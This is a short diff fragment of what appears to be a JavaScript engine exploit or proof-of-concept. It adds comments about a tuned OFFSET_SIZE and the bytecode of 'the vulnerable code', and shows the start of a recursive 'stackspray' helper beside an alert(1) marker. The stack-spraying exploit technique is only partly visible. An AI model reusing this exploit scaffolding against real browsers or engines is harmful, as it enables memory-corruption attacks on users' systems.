@@ -3,7 +3,8 @@
 alert(1);
 
 OFFSET_SIZE = 7;
-
+// Default offset_size is: OFFSET_SIZE = 400;
+// Running in debug mode with OFFSET_SIZE=7 produces the following bytecode for the vulnerable code:
 // Fill the stack with the return value of the provided function.
 function stackspray(f, x, d) {
   if(d==0) return;
